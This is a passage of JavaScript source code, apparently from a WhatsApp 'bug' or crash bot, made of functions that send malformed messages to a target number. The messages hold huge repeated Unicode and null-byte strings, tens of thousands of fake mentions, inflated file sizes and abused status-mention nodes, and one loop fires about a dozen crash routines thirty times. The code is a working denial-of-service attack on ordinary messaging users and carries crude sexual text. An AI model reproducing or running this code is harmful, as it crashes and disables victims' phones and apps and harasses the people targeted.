QQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            caption: "This is an ad caption",
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890",
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "Ueheheheeh",
            body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://t.me/xatanicvxii",
            mediaUrl: "https://t.me/xatanicvxii",
            containsAutoReply: true,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example",
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://t.me/xatanicvxii",
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example",
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " target ",
            contentType: "UPDATE",
            accessibilityText: " target ",
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
          smbcayCampaignId: "smb_cay_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true,
          },
        },
      },
    },
    Ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

async function TrashSystem(target, caywzzimg, Ptcp = true) {
  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              mentionedJid: [target, "13135550002@s.whatsapp.net"],
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: caywzzimg,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮̤͟\n" + "ꦽ".repeat(45000) + "@0".repeat(17000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson:
                    '{ display_text: \'🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟\', url: "https://t.me/xatanicvxii", merchant_url: "https://t.me/caywzzaja" }',
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
              messageParamsJson: "{}",
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    Ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"));
}

async function InvisibleLoadFast(target, ptcp = true) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "🌸 - 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await cay.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function InVisiXz(target, caywzzimg, cct = false, ptcp = false) {
  let etc = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 9007199254740991,
                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1723855952",
                contactVcard: true,
                thumbnailDirectPath:
                  "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256:
                  "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: caywzzimg,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
            },
            nativeFlowMessage: {
              messageParamsJson:
                '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
              buttons: [
                cct
                  ? {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟' +
                        "᬴".repeat(0) +
                        '","sections":[{"title":"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","rows":[]}]}',
                    }
                  : {
                      name: "payment_method",
                      buttonParamsJson: "",
                    },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
                {
                  name: "payment_method",
                  buttonParamsJson: "{}",
                },
                {
                  name: "single_select",
                  buttonParamsJson:
                    '{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟","sections":[{"title":"🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟","rows":[]}]}',
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson:
                    '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"〽️","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                },
                {
                  name: "mpm",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    }),
    {
      userJid: target,
      quoted: QBug,
    }
  );

  await cay.relayMessage(
    target,
    etc.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
}
async function XiosVirus(target) {
  cay.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}
async function BugIos(target) {
  for (let i = 0; i < 30; i++) {
    await IosMJ(target, true);
    await XiosVirus(target);
    await QDIphone(target);
    await QPayIos(target);
    await QPayStriep(target);
    await FBiphone(target);
    await VenCrash(target);
    await AppXCrash(target);
    await SmCrash(target);
    await SqCrash(target);
    await IosMJ(target, true);
    await XiosVirus(target);
  }
  console.log(chalk.red.bold(`( ! ) Succes Sending Bug To Target`));
}
async function sendOfferCall(target) {
  try {
    await cay.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}
async function delayforceMessage(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: cay.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 35675873277,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: " Caywzz Aja 🌠⃔͒⃰   ",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath:
                  "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: " Caywzz Aja 🌠⃔͒⃰   ",
              },
            },
          },
          body: {
            text: " Caywzz Aja 🌠⃔͒⃰   " + "ꦾ".repeat(10000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "cta_url",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "cta_call",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "cta_copy",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "cta_reminder",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "address_message",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "send_location",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "quick_reply",
                buttonParamsJson: "\u0000".repeat(90000),
              },
              {
                name: "mpm",
                buttonParamsJson: "\u0000".repeat(90000),
              },
            ],
          },
        },
      },
    },
  };
  await cay.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function xfrix(target) {
  const buttoncrash = {
    quotedMessage: {
      buttonsMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype:
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "Caywzz - Starevxz",
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath:
            "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          //contactVcard: true,
          caption: "\n",
        },
        contentText: "Caywzz - Starevxz",
        footerText: "\u0000".repeat(850000),
        buttons: [
          {
            buttonId: "Caywzz - Starevxz",
            buttonText: {
              displayText: "𐎟",
            },
            type: 1,
          },
        ],
        headerType: 3,
      },
    },
  };
  await cay.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "\u0000".repeat(0),
            listType: 1,
            singleSelectReply: { selectedRowId: "id" },
            description: "oi",
            contextInfo: {
              businessOwnerJid: "5511954801380@s.whatsapp.net",
              participant: "13135550002@s.whatsapp.net",
              mentionedJid: `Caywzz - Starevxz` || [from],
              quotedMessage: buttoncrash.quotedMessage,
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function xfrixbeta(target) {
  await cay.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            body: {
              text: " Caywzz - Starevxz ",
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}
async function InvisibleCaywzz(target, msg, Ptcp = true) {
  await cay.relayMessage(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          body: {
            text: "Caywzz - Starevxz",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  });

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
  });

  if (target) {
    await cay.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    });
  }
}
async function DelayInVis(target) {
  let push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath:
          "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar:
          "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage:
      proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [],
      }),
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: "bijiku",
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
            }),
            carouselMessage:
              proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
          }),
        },
      },
    },
    {}
  );

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (target) {
    await cay.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Cay Invisible!" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function DelayMakerOverload(target, ptcp = true) {
  await cay.relayMessage(
    target,
    {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: "12260",
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
          },
          mentionedJid: [
            "6289673110783@s.whatsapp.net",
            ...Array.from(
              { length: 25000 },
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            ),
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}
async function VampBroadcast(target, mention = true) {
  // Default true biar otomatis nyala
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Vampire Here",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Dont Bothering Me Bro!!!",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await cay.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (mention) {
    await cay.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Vampire Here Bro" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function SendInteractiveOverload(target, ptcp = true) {
  await cay.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Well, Looks",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 2,
            },
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}
async function EpHemeral(target, ptcp = true) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "caywzzajala",
              hasMediaAttachment: false,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson:
                    "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
